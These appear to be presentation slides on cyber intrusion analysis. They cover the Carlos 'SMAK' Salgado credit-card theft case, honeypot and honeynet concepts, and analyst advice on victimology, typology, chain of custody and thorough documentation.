Case Study D
– Carlos “SMAK” Salgado
• Hacked several companies doing business on the WWW, including 
an ISP, gained unauthorized access, and harvested tens of 
thousands of credit card records.
• Two of the companies involved had no knowledge of being hacked 
until they were contacted by the FBI
• SMAK made about $200k from the sale of credit card information to 
other criminals, who in turn inflicted $10 million in damage upon the 
consuming public.
• SMAK pleaded guilty on four of the five counts, and received 2 1/2 
years in federal prison and five years of probation.

Thinking about Assessments?
» If you were an Analyst on this event
– How would you have analyzed the events?
• Would you consider the difficulty?
• Would you consider the target?
• Would you consider the outcome?
– How would one analyze this threat?
• Typology
• Victimology
• Other methods

Honeynet Technologies
» In order to catch someone crafty you need to be crafty
» Honeypots and Honeynets
– A  security resource who’s value lies in being probed, attacked 
or compromised
– Has no production value, anything going to or from a honeypot is
likely a probe, attack or compromise
– The desire is to be replicas or appear as production network 
resources
– A honeypot is an information system resource whose value lies 
in unauthorized or illicit use of that resource.
– Has no production value, anything going to or from a honeypot is
likely a probe, attack or compromise.
– Primary value to most organizations is information and 
deception.

Honeypots
» Advantages
– Collect small data sets of high value.
– Reduce false positives
– Catch new attacks, false negatives
– Work in encrypted or IPv6 environments
– Simple concept requiring minimal resources
» Disadvantages
– Limited field of view (microscope)
• You can’t rely solely on honeynet technologies
– Risk (mainly high-interaction honeypots)
• They require a large amount of analysis
• Automation is not perfect if operating on a limited budget

Honeypot Types
» Many Types Available
– http://www.honeynet.org
– High Interaction - Does not scale well
• Resources
• Machines
• Data Analysis
– Low Interaction - Can scale
• Specific Purpose
• Strategic Deployment

Jedi Mind Tricks!
» Spend more time analyzing attacks
» Spend more time performing analysis
» Perform Victimology and Typology for each 
incident and affected system
» Build a profile of the Incident, you may see 
cross-over with approaches and methods 
against multiple events
» Use the lessons learned to add stronger policy 
and countermeasures

Thinking like a Analyst
» Professional Recommendations
– Create photos
• You can save a lot of time on documentation by attaching 
photos to the case (operational environment, storage, etc.)
– You cannot decide to create a chain-of-custody if you have 
already performed any of these steps
• Think before you act
– If you are working a prosecutable intrusion, ask for an attorney to 
help you formulate a plan of approach
– Always describe every possible detail in the reports
• You never know what will be important later
• You never know what clue will lead to the “needle”
– Take more time to study non-cyber based criminal case studies
• You can relate to how signatures were identified
• Learn more about Criminal Sciences
• Document every detail, no matter how minute, it may be a clue for 
later

In Short…
» Analysis Suggestions
– Attempting to better understand your threats can increase your 
awareness of your network and protection needs
– Defining your assets and valuables can identify possible threats
– Studying non-cyber based criminal case studies can:
• Increase your ability to correlate events with more insight
• Studying more Criminal Case Studies can augment experience
– Cyber Crimes
– Serial Murders
– Habitual Offenders
• Provide you with understandings of resources and tools not 
commonly available to Security Programs
– Keep up to-date on latest exploits and trends…
– Maintain an active record of your environment
– Be aware of what your network behavior

Famous Dead Guy Quotes
What enables an intelligent leader (intrusion analysts) 
to overcome others (cyber-criminals) is 
foreknowledge.  All matters require foreknowledge
Sun Tzu
The Art of War
The price one pays for pursuing any profession or 
calling is an intimate knowledge of its ugly side.
